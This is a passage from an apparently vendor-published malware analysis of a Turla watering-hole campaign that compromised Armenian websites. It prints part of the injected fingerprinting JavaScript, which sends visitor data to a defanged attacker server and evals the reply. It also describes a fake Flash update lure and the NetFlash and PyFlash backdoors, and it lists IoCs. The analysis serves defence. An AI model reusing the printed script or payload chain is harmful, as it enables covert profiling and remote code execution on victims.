class="crayon-o">+</span><span class="crayon-v">value</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581be401607363992723-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'scp'</span><span class="crayon-o">:</span><span class="crayon-v">screen</span><span class="crayon-sy">.</span><span class="crayon-v">pixelDepth</span><span class="crayon-o">==</span><span class="crayon-v">undefined</span><span class="crayon-sy">?</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-cn">0</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-o">:</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-v">screen</span><span class="crayon-sy">.</span><span class="crayon-v">pixelDepth</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'scw'</span><span class="crayon-o">:</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-v">screen</span><span class="crayon-sy">.</span><span class="crayon-v">width</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581be401607363992723-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'sch'</span><span class="crayon-o">:</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-v">screen</span><span class="crayon-sy">.</span><span class="crayon-v">height</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'bn'</span><span class="crayon-o">:</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-v">bn</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581be401607363992723-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'bv'</span><span class="crayon-o">:</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-v">bv</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'bc'</span><span class="crayon-o">:</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-v">bc</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581be401607363992723-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'osn'</span><span class="crayon-o">:</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-v">osn</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'osv'</span><span class="crayon-o">:</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-v">osv</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581be401607363992723-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'osc'</span><span class="crayon-o">:</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-v">osc</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'adr'</span><span class="crayon-o">:</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-v">adr</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581be401607363992723-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'pdr'</span><span class="crayon-o">:</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-v">pdr</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'fla'</span><span class="crayon-o">:</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-v">fla</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581be401607363992723-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'jav'</span><span class="crayon-o">:</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-v">jav</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'wmp'</span><span class="crayon-o">:</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-v">wmp</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581be401607363992723-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'msw'</span><span class="crayon-o">:</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-v">msw</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'qui'</span><span class="crayon-o">:</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-v">qui</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581be401607363992723-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'sho'</span><span class="crayon-o">:</span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-v">sho</span><span class="crayon-o">+</span><span class="crayon-s">''</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-s">'type'</span><span class="crayon-o">:</span><span class="crayon-s">'info'</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581be401607363992723-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">'tiz'</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-o">+</span><span class="crayon-sy">(</span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">Date</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">getTimezoneOffset</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-o">/</span><span class="crayon-cn">60</span><span class="crayon-sy">)</span><span class="crayon-o">+</span><span class="crayon-s">''</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581be401607363992723-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">json</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">JSON</span><span class="crayon-sy">.</span><span class="crayon-e">stringify</span><span class="crayon-sy">(</span><span class="crayon-v">jsonText</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-28">&nbsp;</div><div class="crayon-line" id="crayon-60581be401607363992723-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">ajax</span><span class="crayon-sy">(</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">content_type</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">'application/json'</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581be401607363992723-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">url</span><span class="crayon-o">:</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">'http://skategirlchina[.]com/wp-includes/data_from_db_top.php?http://skategirlchina[.]com/wp-includes/data_from_db_top.php'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">crossDomain</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581be401607363992723-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">'POST'</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">data</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">json</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581be401607363992723-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">onSuccess</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">function</span><span class="crayon-sy">(</span><span class="crayon-v">m</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">eval</span><span class="crayon-sy">(</span><span class="crayon-v">m</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581be401607363992723-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581be401607363992723-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581be401607363992723-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">ec</span><span class="crayon-sy">.</span><span class="crayon-e">set</span><span class="crayon-sy">(</span><span class="crayon-s">'ec'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;redacted MD5 value&gt;'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581be401607363992723-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">setTimeout</span><span class="crayon-sy">(</span><span class="crayon-v">f_ec</span><span class="crayon-sy">,</span><span class="crayon-cn">1500</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581be401607363992723-43"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0013 seconds] -->
<p><em>Figure 2. Fingerprint script (malicious URLs defanged)</em></p>
<p>If the visitor is deemed interesting, the server replies with a piece of JavaScript code that creates an iframe. Data from ESET telemetry suggests that, for this campaign, only a very limited number of visitors were considered interesting by Turla’s operators.</p>
<p>This iframe displays a fake Adobe Flash update warning to the user, shown in Figure 3, in order to trick them into downloading a malicious Flash installer.</p>
<div id="attachment_135903" style="width: 710px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-3.png"><img class="wp-image-135903" src="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-3-300x172.png" alt="" width="700" height="401" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-3-300x172.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-3-768x440.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-3-1024x587.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-3.png 1108w" sizes="(max-width: 700px) 100vw, 700px" /></a><p class="wp-caption-text"><i>Figure 3. Fake Adobe Flash update iframe</i></p></div>
<p>We did not observe the use of any browser vulnerabilities. The compromise attempt relies only on this social engineering trick. Once the malicious executable is downloaded from the same server as the iframe’s JavaScript, and if the user launches it manually, a Turla malware variant and a legitimate Adobe Flash program are installed.</p>
<p>Figure 4 is an overview of the compromise process from initially visiting one of the compromised Armenian websites to the delivery of a malicious payload.</p>
<div id="attachment_135904" style="width: 610px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-4.png"><img class="wp-image-135904" src="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-4-217x300.png" alt="" width="600" height="829" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-4-217x300.png 217w, https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-4-768x1061.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-4-741x1024.png 741w, https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-4.png 815w" sizes="(max-width: 600px) 100vw, 600px" /></a><p class="wp-caption-text"><i>Figure 4. Overview of the watering hole operation</i></p></div>
<h2>Malware</h2>
<p>Once the user executes the fake installer, it will execute both a Turla malware variant and a legitimate Adobe Flash installer. Thus, the user is likely to believe that the update warning was legitimate.</p>
<h3>Before September 2019: Skipper</h3>
<p>Prior to the end of August 2019, the victim would receive a RAR-SFX archive containing a legitimate Adobe Flash v14 installer and a second RAR-SFX archive. The latter contains the various components of a backdoor known as Skipper that has been previously attributed to Turla. It was documented in 2017 by researchers from <a href="https://labs.bitdefender.com/wp-content/uploads/downloads/new-pacifier-apt-components-point-to-russian-linked-turla-group/" target="_blank" rel="noopener">Bitdefender</a>, and a more recent version was documented by <a href="https://blog.telsy.com/following-the-turlas-skipper-over-the-ocean-of-cyber-operations/" target="_blank" rel="noopener">Telsy</a> in May 2019.</p>
<p>Given that there are only minor changes between the documented versions and the most recent ones, we won’t provide a detailed analysis here.</p>
<p>One interesting change is that the Skipper communication module uses the server that hosts this campaign’s remote JavaScripts and malicious binaries for its C&amp;C server, specifically <nobr><span style="font-family: courier new, courier, monospace;">skategirlchina[.]com/wp-includes/ms-locale.php</span></nobr>.</p>
<h3>From September 2019: NetFlash and PyFlash</h3>
<p>At the end of August 2019, we noticed that the payload delivered by <span style="font-family: courier new, courier, monospace;">skategirlchina[.]com</span> changed.</p>
<h4><strong>NetFlash (.NET downloader)</strong></h4>
<p>The new payload was a .NET application that dropped an installer for Adobe Flash v32 in <span style="font-family: courier new, courier, monospace;">%TEMP%\adobe.exe</span>, and NetFlash (a .NET downloader) in <span style="font-family: courier new, courier, monospace;">%TEMP%\winhost.exe</span>.</p>
<p>According to their compilation timestamps, the malware samples were compiled at the end of August 2019 and at the beginning on September 2019, right before being uploaded to the watering hole’s C&amp;C server.</p>
<p>NetFlash downloads its second stage malware from a hardcoded URL and establishes persistence for this new backdoor using a Windows scheduled task. Figure 5 shows the NetFlash function that downloads the second stage malware, named PyFlash. We also encountered another NetFlash sample, likely compiled at the end of August 2019, with a different hardcoded C&amp;C server: <span style="font-family: courier new, courier, monospace;">134.209.222[.]206:15363</span>.</p>
<div id="attachment_135908" style="width: 709px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-5-1.png"><img class="wp-image-135908" src="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-5-1-300x125.png" alt="" width="699" height="291" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-5-1-300x125.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-5-1-768x320.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-5-1-1024x426.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-5-1.png 1055w" sizes="(max-width: 699px) 100vw, 699px" /></a><p class="wp-caption-text"><i>Figure 5. Main function of NetFlash</i></p></div>
<h4><strong>PyFlash</strong></h4>
<p>This second stage backdoor is a py2exe executable. py2exe is a Python extension to convert a Python script into a standalone Windows executable. To our knowledge, this is the first time the Turla developers have used the Python language in a backdoor.</p>
<p>The backdoor communicates with its hardcoded C&amp;C server via HTTP. The C&amp;C URL and other parameters such as the AES key and IV used to encrypt all network communications are specified at the beginning of the script, as shown in Figure 6.</p>
<div id="attachment_135910" style="width: 708px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-6-1.png"><img class="wp-image-135910" src="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-6-1-300x62.png" alt="" width="698" height="144" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-6-1-300x62.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-6-1-768x159.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-6-1-1024x211.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-6-1.png 1061w" sizes="(max-width: 698px) 100vw, 698px" /></a><p class="wp-caption-text"><i>Figure 6. Global variables in the PyFlash Python script</i></p></div>
<p>The main function of the script, shown in Figure 7, sends information about the machine to the C&amp;C server. This is the output of the functions from the commands list seen in Figure 6. It includes OS-related commands (<span style="font-family: courier new, courier, monospace;">systeminfo</span>, <span style="font-family: courier new, courier, monospace;">tasklist</span>) and network-related commands (<span style="font-family: courier new, courier, monospace;">ipconfig</span>, <span style="font-family: courier new, courier, monospace;">getmac</span>, <span style="font-family: courier new, courier, monospace;">arp</span>).</p>
<div id="attachment_135911" style="width: 710px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-7-1.png"><img class="wp-image-135911" src="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-7-1-300x138.png" alt="" width="700" height="323" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-7-1-300x138.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-7-1-768x354.png 768w, https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-7-1-1024x473.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2020/03/Figure-7-1.png 1183w" sizes="(max-width: 700px) 100vw, 700px" /></a><p class="wp-caption-text"><i>Figure 7. Main function of PyFlash</i></p></div>
<p>The C&amp;C server can also send backdoor commands in JSON format. The commands implemented in this version of PyFlash are:</p>
<ul>
<li>Download additional files from a given HTTP(S) link.</li>
<li>Execute a Windows command using the Python function <span style="font-family: courier new, courier, monospace;">subprocess32.Popen</span>.</li>
<li>Change the execution delay: modifies the Windows task that regularly (every X minutes; 5 by default) launches the malware.</li>
<li>Kill (uninstall) the malware. To confirm this instruction the malware sends a POST request to the C&amp;C server with the following string:</li>
</ul>
<p style="text-align: left; padding-left: 60px;"><em>I&#8217;m dying :(<br />
Tell my wife that i love her&#8230;</em></p>
<p>Then, the output of the command is sent back to the operators, encrypted with AES, via a POST request.</p>
<h2>Conclusion</h2>
<p>Turla is still using watering hole attacks as one of its initial access tactics. Interestingly, this campaign relies on a well-known social engineering trick – a fake Adobe Flash update warning – in order to induce the user to download and install malware.</p>
<p>On the other hand, the payload has changed, probably in order to evade detection, as Skipper has been known for many years. They switched to NetFlash, which installs a backdoor we call PyFlash and that is developed in the Python language.</p>
<p><em>We will continue monitoring new Turla activities and will publish relevant information on our blog. For any inquiries, contact us as </em><a href="mailto:threatintel@eset.com"><em>threatintel@eset.com</em></a><em>. Indicators of Compromise can also be found on our </em><a href="https://github.com/eset/malware-ioc/tree/master/turla#turla-watering-hole-armenia" target="_blank" rel="noopener"><em>GitHub</em></a><em> repository.</em></p>
<h2>Indicators of Compromise (IoCs)</h2>
<h3>Compromised websites</h3>
<ul>
<li><span style="font-family: courier new, courier, monospace;">http://www.armconsul[.]ru/user/themes/ayeps/dist/js/bundle.0eb0f2cb2808b4b35a94.js</span></li>
<li><span style="font-family: courier new, courier, monospace;">http://mnp.nkr[.]am/wp-includes/js/jquery/jquery-migrate.min.js</span></li>
<li><span style="font-family: courier new, courier, monospace;">http://aiisa[.]am/js/chatem/js_rA9bo8_O3Pnw_5wJXExNhtkUMdfBYCifTJctEJ8C_Mg.js</span></li>
<li><span style="font-family: courier new, courier, monospace;">adgf[.]am</span></li>
</ul>
<h3>C&amp;C servers</h3>
<ul>
<li><span style="font-family: courier new, courier, monospace;">http://skategirlchina[.]com/wp-includes/data_from_db_top.php</span></li>
<li><span style="font-family: courier new, courier, monospace;">http://skategirlchina[.]com/wp-includes/ms-locale.php</span></li>
<li><span style="font-family: courier new, courier, monospace;">http://37.59.60[.]199/2018/.config/adobe</span></li>
